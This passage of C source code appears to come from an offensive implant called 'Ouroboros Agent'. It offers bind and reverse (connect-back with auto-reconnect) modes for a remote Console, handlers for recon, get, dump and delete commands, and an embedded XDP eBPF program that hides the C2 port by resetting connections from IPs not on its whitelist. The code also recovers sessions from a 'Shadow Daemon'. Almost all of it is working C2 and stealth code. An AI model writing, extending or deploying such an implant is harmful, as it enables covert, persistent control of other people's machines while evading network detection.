            case CMD_RECON:  handle_recon(c_sock);         break;
            case CMD_GET:    handle_get(c_sock, &cmd);     break;
            case CMD_DUMP_MAP: handle_dump_map(c_sock, &cmd); break;
            case CMD_DELETE: handle_delete(c_sock, &cmd); break;
            case CMD_CLEAR:  handle_clear(c_sock, &cmd);  break;
            default:
                printf("[!] Unknown cmd_type=%u\n", cmd.cmd_type);
        }
    }
    printf("[-] Console disconnected\n");
    close(c_sock);
}


/* Bind Mode: Listen on port, wait for Console connection */
static int run_bind(int port) {
    int l_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (l_sock < 0) { perror("socket"); return 1; }

    int opt = 1;
    setsockopt(l_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {
        .sin_family      = AF_INET,
        .sin_port        = htons(port),
        .sin_addr.s_addr = INADDR_ANY
    };
    if (bind(l_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind"); return 1;
    }
    if (listen(l_sock, 1) < 0) { perror("listen"); return 1; }

    printf("[+] Ouroboros Agent AWAKE — Bind mode on port %d\n", port);

    while (1) {
        struct sockaddr_in peer_addr;
        socklen_t peer_len = sizeof(peer_addr);
        int c_sock = accept(l_sock, (struct sockaddr *)&peer_addr, &peer_len);
        if (c_sock < 0) { perror("accept"); continue; }
        /* Whitelist locking deferred until first valid command verified to prevent nmap -sT false positives */
        handle_connection(c_sock, peer_addr.sin_addr.s_addr);
    }
    return 0;
}

/* Reverse Mode: Actively connect back to Console, auto-reconnect on disconnect */
static int run_reverse(const char *host, int port) {
    printf("[+] Ouroboros Agent AWAKE — Reverse mode → %s:%d\n", host, port);

    while (1) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) { perror("socket"); sleep(5); continue; }

        struct sockaddr_in addr = {
            .sin_family = AF_INET,
            .sin_port   = htons(port),
        };
        if (inet_pton(AF_INET, host, &addr.sin_addr) <= 0) {
            fprintf(stderr, "[-] Invalid IP: %s\n", host);
            close(sock);
            return 1;
        }

        printf("[*] Connecting to %s:%d...\n", host, port);
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            perror("[-] Connect failed, retrying in 5s");
            close(sock);
            sleep(5);
            continue;
        }
        /* Whitelist locking deferred until first valid command (already pre-written in main for reverse mode) */
        handle_connection(sock, addr.sin_addr.s_addr);
        printf("[*] Reconnecting in 5s...\n");
        sleep(5);
    }
    return 0;
}

#include "stealth_link.skel.h"

/* ---- XDP Auto Stealth: Embed and load stealth_link when Agent starts ---- */
static struct stealth_link_bpf *stealth_skel = NULL;

/* Auto detect default route interface name */
static const char *detect_default_iface(void) {
    static char iface[32] = "eth0";
    FILE *fp = fopen("/proc/net/route", "r");
    if (!fp) return iface;
    char line[256];
    fgets(line, sizeof(line), fp); /* Skip header */
    while (fgets(line, sizeof(line), fp)) {
        char name[32];
        unsigned long dest;
        if (sscanf(line, "%31s %lx", name, &dest) == 2 && dest == 0) {
            strncpy(iface, name, sizeof(iface) - 1);
            break;
        }
    }
    fclose(fp);
    return iface;
}

static void auto_load_stealth(int c2_port, const char *ifname) {
    if (!ifname) {
        printf("[*] XDP stealth: no interface specified (-i), skipping\n");
        return;
    }

    /* Privilege check */
    if (getuid() != 0) {
        printf("[*] XDP stealth: not root, skipping\n");
        return;
    }
    if (!check_cap(12) && !check_cap(21)) {  /* CAP_NET_ADMIN || CAP_SYS_ADMIN */
        printf("[*] XDP stealth: missing CAP_NET_ADMIN, skipping\n");
        return;
    }

    unsigned int ifidx = if_nametoindex(ifname);
    if (ifidx == 0) {
        printf("[-] XDP stealth: interface '%s' not found, skipping\n", ifname);
        return;
    }

    /* Load directly from embedded Skeleton, no longer searching for files */
    printf("[*] Loading embedded XDP stealth...\n");
    stealth_skel = stealth_link_bpf__open();
    if (!stealth_skel) {
        printf("[-] Failed to open embedded stealth skeleton\n");
        return;
    }

    if (stealth_link_bpf__load(stealth_skel)) {
        printf("[-] Failed to load embedded stealth skeleton\n");
        stealth_link_bpf__destroy(stealth_skel);
        stealth_skel = NULL;
        return;
    }

    /* Attach to interface */
    stealth_skel->links.stealth_link_xdp = bpf_program__attach_xdp(stealth_skel->progs.stealth_link_xdp, ifidx);
    if (libbpf_get_error(stealth_skel->links.stealth_link_xdp)) {
        printf("[-] Failed to attach embedded XDP to %s\n", ifname);
        stealth_link_bpf__destroy(stealth_skel);
        stealth_skel = NULL;
        return;
    }

    printf("[+] XDP stealth (embedded) attached to %s\n", ifname);

    /* Initialize hidden port */
    uint16_t port_key = (uint16_t)c2_port;
    uint32_t val = 1;
    if (bpf_map__update_elem(stealth_skel->maps.target, &port_key, sizeof(port_key), &val, sizeof(val), BPF_ANY) == 0) {
        printf("[+] C2 port %d hidden from unauthorized access\n", c2_port);
    }
}

static void cleanup_stealth(void) {
    if (stealth_skel) {
        stealth_link_bpf__destroy(stealth_skel);
        stealth_skel = NULL;
    }
}

/* Add Console IP (network byte order) to XDP whitelist and activate filter lock */
static void stealth_allow_ip(uint32_t ip_net) {
    if (!stealth_skel) return;

    /* 1. Write IP whitelist */
    uint32_t val = 1;
    if (bpf_map__update_elem(stealth_skel->maps.whitelist, &ip_net, sizeof(ip_net), &val, sizeof(val), BPF_ANY) == 0) {
        struct in_addr ia = { .s_addr = ip_net };
        printf("[+] XDP: %s whitelisted\n", inet_ntoa(ia));
    }

    /* 2. Activate lock flag */
    uint32_t key = 0, locked = 1;
    bpf_map__update_elem(stealth_skel->maps.whitelist_count, &key, sizeof(key), &locked, sizeof(locked), BPF_ANY);
    printf("[+] XDP: whitelist locked — unauthorized IPs will be RST'd\n");
}


int main(int argc, char *argv[]) {
    if (argc < 2) {
        print_help(argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "-h") == 0) {
        print_help(argv[0]);
        return 0;
    }

    memset(sessions, 0, sizeof(sessions));

    /*
     * Parameter parsing:
     *   -b <PORT> [-i <iface>]
     *   -r <IP> <PORT> [-i <iface>]
     *   <PORT> [-i <iface>]        (Legacy compatibility)
     */
    const char *mode = NULL;
    const char *host = NULL;
    int port = 0;
    const char *xdp_iface = NULL;  /* NULL = 不启用 XDP */

    int i = 1;
    while (i < argc) {
        if (strcmp(argv[i], "-b") == 0 && i + 1 < argc) {
            mode = "bind";
            port = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-r") == 0 && i + 2 < argc) {
            mode = "reverse";
            host = argv[++i];
            port = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-i") == 0 && i + 1 < argc) {
            xdp_iface = argv[++i];
        } else if (!mode && isdigit((unsigned char)argv[i][0])) {
            mode = "bind";
            port = atoi(argv[i]);
        } else {
            fprintf(stderr, "[-] Unknown option: %s. Use --help for usage.\n", argv[i]);
            return 1;
        }
        i++;
    }

    if (!mode || port == 0) {
        fprintf(stderr, "[-] Missing mode or port. Use --help for usage.\n");
        return 1;
    }

    auto_load_stealth(port, xdp_iface);

    /* Reverse Mode: Known Console IP (the host from -r), immediately pre-write whitelist and lock.
     * Bind Mode: Initial whitelist is empty, XDP allows everyone, automatically locks after Console connects. */
    if (mode && strcmp(mode, "reverse") == 0 && host) {
        struct in_addr ia;
        if (inet_pton(AF_INET, host, &ia) == 1)
            stealth_allow_ip(ia.s_addr);  /* 预写 Console IP，其他人一开始就被 RST */
    }

    /* Recover surviving sessions from Shadow Daemon after disconnection */
    recover_from_shadows();

    if (strcmp(mode, "bind") == 0)
        return run_bind(port);
    else
        return run_reverse(host, port);
}